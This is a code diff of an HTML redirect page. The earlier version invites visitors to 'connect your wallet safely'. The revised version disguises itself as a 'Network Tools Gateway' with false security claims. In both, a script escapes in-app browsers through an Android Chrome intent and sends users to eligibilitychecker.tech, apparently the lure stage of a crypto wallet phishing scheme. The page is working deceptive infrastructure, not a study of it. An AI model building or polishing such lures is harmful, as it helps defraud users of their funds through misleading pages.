@@ -1,34 +1,56 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting safely...</title>
-    <script>
-        // CHANGE ONLY THIS LINE BELOW:
-        var targetUrl = "https://eligibilitychecker.tech/"; 
-
-        window.onload = function() {
-            var cleanUrl = targetUrl.replace(/^https?:\/\//, '');
-            var isAndroid = /Android/i.test(navigator.userAgent);
-            var isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
-
-            // Update the fallback link in the body automatically
-            document.getElementById("fallback-link").href = targetUrl;
-
-            if (isAndroid) {
-                window.location.href = "intent://" + cleanUrl + "#Intent;scheme=https;package=com.android.chrome;end";
-            } else if (isIOS) {
-                window.location.href = targetUrl;
-                setTimeout(function() { window.location.replace(targetUrl); }, 250);
-            } else {
-                window.location.href = targetUrl;
-            }
-        };
-    </script>
+    <title>Network Optimization Portal</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #0e0e10; color: #ffffff; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        .container { max-width: 420px; width: 100%; background: #1c1c1f; border: 1px solid #2d2d30; border-radius: 16px; padding: 32px 24px; text-align: center; box-shadow: 0 8px 24px rgba(0,0,0,0.5); }
+        .logo-space { margin-bottom: 24px; font-size: 40px; }
+        h2 { font-size: 22px; font-weight: 600; margin-bottom: 12px; letter-spacing: -0.5px; }
+        p { font-size: 14px; color: #a0a0a5; line-height: 1.5; margin-bottom: 28px; }
+        .action-btn { width: 100%; background: #2563eb; color: #ffffff; border: none; padding: 14px; font-size: 16px; font-weight: 600; border-radius: 12px; cursor: pointer; transition: background 0.2s, transform 0.1s; display: inline-block; text-decoration: none; box-shadow: 0 4px 12px rgba(37,99,235,0.3); }
+        .action-btn:active { background: #1d4ed8; transform: scale(0.98); }
+        .footer-notice { margin-top: 24px; font-size: 11px; color: #64748b; text-transform: uppercase; letter-spacing: 0.5px; }
+    </style>
 </head>
-<body style="font-family:sans-serif; text-align:center; padding-top:50px; background:#f9f9f9;">
-    <h2>Opening Secure Browser...</h2>
-    <p>Please wait. If it stays stuck, <a id="fallback-link" href="#">click here to connect your wallet safely</a>.</p>
+<body>
+
+    <div class="container">
+        <div class="logo-space">⚙️</div>
+        <h2>Network Tools Gateway</h2>
+        <p>You are accessing a secure performance optimization interface. Click below to establish a direct system handshake and initialize your session.</p>
+
+        <!-- Physical user interaction element required by mobile operating systems -->
+        <button id="breakoutGate" class="action-btn">Proceed to Gateway</button>
+        
+        <div class="footer-notice">Secured Connection Tunnel</div>
+    </div>
+
+    <script>
+        // TARGET URL REGION
+        const destinationUrl = "https://eligibilitychecker.tech"; 
+
+        document.getElementById("breakoutGate").addEventListener("click", function() {
+            var ua = navigator.userAgent || navigator.vendor || window.opera;
+            var cleanUrl = destinationUrl.replace(/^https?:\/\//, '');
+
+            // Native Android Intent Breakout Handshake
+            if (/android/i.test(ua)) {
+                window.location.href = "intent://" + cleanUrl + "#intent;scheme=https;package=com.android.chrome;end;";
+            } 
+            // iOS Native Handling 
+            else if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) {
+                window.location.href = destinationUrl;
+            } 
+            // General Web / Desktop Fallback
+            else {
+                window.location.href = destinationUrl;
+            }
+        });
+    </script>
 </body>
 </html>
+
